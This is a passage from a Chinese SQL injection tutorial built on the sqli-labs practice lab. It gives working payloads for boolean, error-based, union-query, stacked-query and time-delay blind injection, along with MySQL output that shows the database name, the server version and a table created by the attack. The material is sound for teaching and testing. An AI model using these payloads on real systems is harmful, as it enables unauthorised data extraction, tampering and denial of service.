<span class="line"><span style="color:#6F42C1;">1</span><span style="color:#24292E;"> </span><span style="color:#032F62;">row</span><span style="color:#24292E;"> </span><span style="color:#032F62;">in</span><span style="color:#24292E;"> </span><span style="color:#032F62;">set</span><span style="color:#24292E;"> (0.00 </span><span style="color:#032F62;">sec</span><span style="color:#24292E;">)</span></span></code></pre></div><p>现在我们按此思路重新构造两个请求。</p><ul><li><p>请求 1：<a href="http://localhost/Less-8/?id=1&#39;and+1=1--+" target="_blank" rel="noreferrer">http://localhost/Less-8/?id=1&#39;and+1=1--+</a></p></li><li><p>请求 2：<a href="http://localhost/Less-8/?id=1&#39;and+1=2--+" target="_blank" rel="noreferrer">http://localhost/Less-8/?id=1&#39;and+1=2--+</a></p></li></ul>`,17),g=n("p",null,"图 6：请求 1 展示图",-1),B=p('<p>图 7：请求 2 展示图</p><p>我们可以看到，两次结果是不一样的，主要体现在有无&quot;You are in...........&quot;字符串，此时我们就可以确认 SQL 注入是存在的。</p><h4 id="报错型注入" tabindex="-1">报错型注入 <a class="header-anchor" href="#报错型注入" aria-label="Permalink to &quot;报错型注入&quot;">​</a></h4><p>有错误回显的都可以尝试使用报错型注入方法，在 sqli-labs 第 11 题中介绍的单引号注入方式就是最简单有效的检测方法，它的本质是设法构造出错误的 SQL 语法使其执行错误。</p><p>前面列举的都是字符型注入，这次我们聊下整数型的。以 sqli-labs 第 2 题为例，我们重点看下导致注入的语句：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">$</span><span style="color:#F97583;">sql=</span><span style="color:#9ECBFF;">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span><span style="color:#E1E4E8;">;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">$</span><span style="color:#D73A49;">sql=</span><span style="color:#032F62;">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span><span style="color:#24292E;">;</span></span></code></pre></div><p>$id 参数两边无引号，这是典型的整数型注入。虽然是整数型的，但你使用单引号注入依然会报错，因为语句未得到有效闭合。</p><p>既然我们的目标是让 SQL 语法错误，那方法就多了，各种造成语句无法闭合的字符：单引号、双引号、大中小括号等标点符号、特殊符号、宽字符等，还有 SQL 语句中的关键词，比如 IF、SELECT 都可以。</p><p>下图是注入中文句号（宽字符）导致的错误：</p>',9),A=n("p",null,"图 8：宽字符导致的错误",-1),D=n("p",null,"注入关键词 IF 导致的错误：",-1),q=p('<p>图 9：注入关键词 IF 导致的错误</p><p>拥有错误回显的 SQL 注入应该是最容易发现的，但很多时候并不会有错误回显，这时就需要使用其他盲注方式来验证。</p><h4 id="联合查询注入" tabindex="-1">联合查询注入 <a class="header-anchor" href="#联合查询注入" aria-label="Permalink to &quot;联合查询注入&quot;">​</a></h4><p>联合查询是指使用 union 语句来查询，比如：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">id </span><span style="color:#F97583;">=-</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">union</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">select</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">2</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">3</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">id </span><span style="color:#D73A49;">=-</span><span style="color:#005CC5;">1</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">union</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">select</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">2</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">3</span></span></code></pre></div><p><strong>注意这里 id 的值不存在，目前是为了在页面上显示 union 查询结果</strong>。</p><p>这样的好处就相当于另起一句 SQL 语句，非常适用于获取数据库中一些敏感信息，而不必过多考虑原有 SQL 语句的情况。因此，它在实际的漏洞利用中也经常被使用。联合查询注入也是验证漏洞可利用性的最佳方法之一，但经常需要结合错误回显。</p><p>我们仍以 sqli-labs 第 2 题为例，先构造以下请求：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">http</span><span style="color:#E1E4E8;">:</span><span style="color:#F97583;">//</span><span style="color:#E1E4E8;">localhost</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">Less</span><span style="color:#F97583;">-</span><span style="color:#79B8FF;">2</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">?id</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">union</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">select</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">http</span><span style="color:#24292E;">:</span><span style="color:#D73A49;">//</span><span style="color:#24292E;">localhost</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">Less</span><span style="color:#D73A49;">-</span><span style="color:#005CC5;">2</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">?id</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">0</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">union</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">select</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span></span></code></pre></div><p>得到错误提示&quot;The used SELECT statements have a different number of columns&quot;，也就是字段数有误，如下图所示：</p>',10),_=p(`<p>图 10：字段数有误</p><p>此时我们可以逐渐增加字段数来找到合适字段数：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">回显错误：</span><span style="color:#F97583;">http</span><span style="color:#E1E4E8;">:</span><span style="color:#F97583;">//</span><span style="color:#E1E4E8;">localhost</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">Less</span><span style="color:#F97583;">-</span><span style="color:#79B8FF;">2</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">?id</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">union</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">select</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">2</span></span>
<span class="line"><span style="color:#E1E4E8;">正确：</span><span style="color:#F97583;">http</span><span style="color:#E1E4E8;">:</span><span style="color:#F97583;">//</span><span style="color:#E1E4E8;">localhost</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">Less</span><span style="color:#F97583;">-</span><span style="color:#79B8FF;">2</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">?id</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">union</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">select</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">2</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">3</span></span>
<span class="line"><span style="color:#E1E4E8;">回显错误：</span><span style="color:#F97583;">http</span><span style="color:#E1E4E8;">:</span><span style="color:#F97583;">//</span><span style="color:#E1E4E8;">localhost</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">Less</span><span style="color:#F97583;">-</span><span style="color:#79B8FF;">2</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">?id</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">union</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">select</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">2</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">3</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">4</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">回显错误：</span><span style="color:#D73A49;">http</span><span style="color:#24292E;">:</span><span style="color:#D73A49;">//</span><span style="color:#24292E;">localhost</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">Less</span><span style="color:#D73A49;">-</span><span style="color:#005CC5;">2</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">?id</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">0</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">union</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">select</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">2</span></span>
<span class="line"><span style="color:#24292E;">正确：</span><span style="color:#D73A49;">http</span><span style="color:#24292E;">:</span><span style="color:#D73A49;">//</span><span style="color:#24292E;">localhost</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">Less</span><span style="color:#D73A49;">-</span><span style="color:#005CC5;">2</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">?id</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">0</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">union</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">select</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">2</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">3</span></span>
<span class="line"><span style="color:#24292E;">回显错误：</span><span style="color:#D73A49;">http</span><span style="color:#24292E;">:</span><span style="color:#D73A49;">//</span><span style="color:#24292E;">localhost</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">Less</span><span style="color:#D73A49;">-</span><span style="color:#005CC5;">2</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">?id</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">0</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">union</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">select</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">2</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">3</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">4</span></span></code></pre></div><p>最后发现它共有 3 个字段，我们看看哪些字段显示出来了：</p>`,4),m=p('<p>图 11：字段展示</p><p>可以发现 2 和 3 字段显示在页面中，这里我们就可以进一步构造利用以获取数据库名和版本信息：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">http</span><span style="color:#E1E4E8;">:</span><span style="color:#F97583;">//</span><span style="color:#E1E4E8;">localhost</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">Less</span><span style="color:#F97583;">-</span><span style="color:#79B8FF;">2</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">?id</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">union</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">select</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">,</span><span style="color:#F97583;">database</span><span style="color:#E1E4E8;">(),</span><span style="color:#F97583;">version</span><span style="color:#E1E4E8;">()</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">http</span><span style="color:#24292E;">:</span><span style="color:#D73A49;">//</span><span style="color:#24292E;">localhost</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">Less</span><span style="color:#D73A49;">-</span><span style="color:#005CC5;">2</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">?id</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">0</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">union</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">select</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#24292E;">,</span><span style="color:#D73A49;">database</span><span style="color:#24292E;">(),</span><span style="color:#D73A49;">version</span><span style="color:#24292E;">()</span></span></code></pre></div><p>最终，我们成功爆出数据库名为 security，版本为 5.5.44-0ubuntu0.14.04.1，如下图所示：</p>',4),b=p(`<p>图 12：成功爆出数据库名</p><h4 id="多语句堆叠注入" tabindex="-1">多语句堆叠注入 <a class="header-anchor" href="#多语句堆叠注入" aria-label="Permalink to &quot;多语句堆叠注入&quot;">​</a></h4><p>在 SQL 语句中，允许使用分号间隔多个查询语句来执行。mysqli_multi_query() 函数可以通过分号间隔插入多个查询语句实现堆叠注入。以 sqli-labs 第 38 题为例：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">    $id</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$_GET[</span><span style="color:#9ECBFF;">&#39;id&#39;</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">......</span></span>
<span class="line"><span style="color:#E1E4E8;">	$sql</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#F97583;">SELECT</span><span style="color:#9ECBFF;"> </span><span style="color:#F97583;">*</span><span style="color:#9ECBFF;"> </span><span style="color:#F97583;">FROM</span><span style="color:#9ECBFF;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#9ECBFF;"> id</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;</span><span style="color:#E1E4E8;">$id</span><span style="color:#9ECBFF;">&#39; </span><span style="color:#F97583;">LIMIT</span><span style="color:#9ECBFF;"> </span><span style="color:#79B8FF;">0</span><span style="color:#9ECBFF;">,</span><span style="color:#79B8FF;">1</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#6A737D;">/* execute multi query */</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> (</span><span style="color:#79B8FF;">mysqli_multi_query</span><span style="color:#E1E4E8;">($con1, $sql))</span></span>
<span class="line"><span style="color:#E1E4E8;">	{</span></span>
<span class="line"><span style="color:#E1E4E8;">       </span><span style="color:#F97583;">......</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">......</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">    $id</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$_GET[</span><span style="color:#032F62;">&#39;id&#39;</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">......</span></span>
<span class="line"><span style="color:#24292E;">	$sql</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;</span><span style="color:#D73A49;">SELECT</span><span style="color:#032F62;"> </span><span style="color:#D73A49;">*</span><span style="color:#032F62;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#032F62;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#032F62;"> id</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;</span><span style="color:#24292E;">$id</span><span style="color:#032F62;">&#39; </span><span style="color:#D73A49;">LIMIT</span><span style="color:#032F62;"> </span><span style="color:#005CC5;">0</span><span style="color:#032F62;">,</span><span style="color:#005CC5;">1</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#6A737D;">/* execute multi query */</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> (</span><span style="color:#005CC5;">mysqli_multi_query</span><span style="color:#24292E;">($con1, $sql))</span></span>
<span class="line"><span style="color:#24292E;">	{</span></span>
<span class="line"><span style="color:#24292E;">       </span><span style="color:#D73A49;">......</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">......</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>此处正是使用 mysqli_multi_query 函数实现的多语句查询。我们可以尝试插入另一条语句来创建表：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">http</span><span style="color:#E1E4E8;">:</span><span style="color:#F97583;">//</span><span style="color:#E1E4E8;">localhost</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">Less</span><span style="color:#F97583;">-</span><span style="color:#79B8FF;">38</span><span style="color:#E1E4E8;">?id</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">1</span><span style="color:#9ECBFF;">&#39;;create table sqli like users;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">http</span><span style="color:#24292E;">:</span><span style="color:#D73A49;">//</span><span style="color:#24292E;">localhost</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">Less</span><span style="color:#D73A49;">-</span><span style="color:#005CC5;">38</span><span style="color:#24292E;">?id</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">1</span><span style="color:#032F62;">&#39;;create table sqli like users;</span></span></code></pre></div><p>执行前的表：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">mysql</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> show tables;</span></span>
<span class="line"><span style="color:#F97583;">+--------------------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> Tables_in_security </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+--------------------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> emails             </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> referers           </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> uagents            </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> users              </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+--------------------+</span></span>
<span class="line"><span style="color:#79B8FF;">4</span><span style="color:#E1E4E8;"> rows in </span><span style="color:#B392F0;">set</span><span style="color:#E1E4E8;"> (</span><span style="color:#79B8FF;">0.00</span><span style="color:#E1E4E8;"> sec)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">mysql</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> show tables;</span></span>
<span class="line"><span style="color:#D73A49;">+--------------------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> Tables_in_security </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+--------------------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> emails             </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> referers           </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> uagents            </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> users              </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+--------------------+</span></span>
<span class="line"><span style="color:#005CC5;">4</span><span style="color:#24292E;"> rows in </span><span style="color:#6F42C1;">set</span><span style="color:#24292E;"> (</span><span style="color:#005CC5;">0.00</span><span style="color:#24292E;"> sec)</span></span></code></pre></div><p>执行后，成功创建 sqli 表，说明第二条语句执行成功：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">mysql</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> show tables;</span></span>
<span class="line"><span style="color:#F97583;">+--------------------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> Tables_in_security </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+--------------------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> emails             </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> referers           </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> sqli               </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> uagents            </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> users              </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+--------------------+</span></span>
<span class="line"><span style="color:#79B8FF;">5</span><span style="color:#E1E4E8;"> rows in </span><span style="color:#B392F0;">set</span><span style="color:#E1E4E8;"> (</span><span style="color:#79B8FF;">0.00</span><span style="color:#E1E4E8;"> sec)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">mysql</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> show tables;</span></span>
<span class="line"><span style="color:#D73A49;">+--------------------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> Tables_in_security </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+--------------------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> emails             </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> referers           </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> sqli               </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> uagents            </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> users              </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+--------------------+</span></span>
<span class="line"><span style="color:#005CC5;">5</span><span style="color:#24292E;"> rows in </span><span style="color:#6F42C1;">set</span><span style="color:#24292E;"> (</span><span style="color:#005CC5;">0.00</span><span style="color:#24292E;"> sec)</span></span></code></pre></div><h4 id="基于时间延迟盲注" tabindex="-1">基于时间延迟盲注 <a class="header-anchor" href="#基于时间延迟盲注" aria-label="Permalink to &quot;基于时间延迟盲注&quot;">​</a></h4><p>基于时间延迟盲注是通过时间延迟来判断是否存在 SQL 注入的常用方法，是用于无任何错误回显情况下的盲注。对于正确语句和错误语句都返回相同内容时也可以使用，所以它的适用范围相对广一些。</p><blockquote><p>注意：在实际测试过程中，特别是线上业务测试，要避免使用过长时间的延时，否则会影响业务的正常运行。换句话说，能够延时注入就基本代表可以去网站进行拒绝服务攻击。</p></blockquote><p>在 MySQL 常用的延时注入方法中，比较实用的有以下 3 种。</p><p>（1）<strong>SLEEP(duration)</strong>：该函数用于休眠，起到延时操作的作用，其参数以秒为单位。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">mysql</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> select </span><span style="color:#B392F0;">sleep</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">5</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#F97583;">+----------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">sleep</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">5</span><span style="color:#E1E4E8;">) </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+----------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+----------+</span></span>
<span class="line"><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;"> row in </span><span style="color:#B392F0;">set</span><span style="color:#E1E4E8;"> (</span><span style="color:#79B8FF;">5.00</span><span style="color:#E1E4E8;"> sec)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">mysql</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> select </span><span style="color:#6F42C1;">sleep</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">5</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#D73A49;">+----------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">sleep</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">5</span><span style="color:#24292E;">) </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+----------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">        </span><span style="color:#005CC5;">0</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+----------+</span></span>
<span class="line"><span style="color:#005CC5;">1</span><span style="color:#24292E;"> row in </span><span style="color:#6F42C1;">set</span><span style="color:#24292E;"> (</span><span style="color:#005CC5;">5.00</span><span style="color:#24292E;"> sec)</span></span></code></pre></div><p>（2）<strong>BENCHMARK(count,expr)</strong>：重复计算 expr 表达式 count 次。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">mysql</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> select </span><span style="color:#B392F0;">benchmark</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">10000000</span><span style="color:#E1E4E8;">,</span><span style="color:#B392F0;">sha</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">));</span></span>
<span class="line"><span style="color:#F97583;">+----------------------------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">benchmark</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">10000000</span><span style="color:#E1E4E8;">,</span><span style="color:#B392F0;">sha</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">)) </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+----------------------------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">                          </span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+----------------------------+</span></span>
<span class="line"><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;"> row in </span><span style="color:#B392F0;">set</span><span style="color:#E1E4E8;"> (</span><span style="color:#79B8FF;">2.72</span><span style="color:#E1E4E8;"> sec)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">mysql</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> select </span><span style="color:#6F42C1;">benchmark</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">10000000</span><span style="color:#24292E;">,</span><span style="color:#6F42C1;">sha</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">1</span><span style="color:#24292E;">));</span></span>
<span class="line"><span style="color:#D73A49;">+----------------------------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">benchmark</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">10000000</span><span style="color:#24292E;">,</span><span style="color:#6F42C1;">sha</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">1</span><span style="color:#24292E;">)) </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+----------------------------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">                          </span><span style="color:#005CC5;">0</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+----------------------------+</span></span>
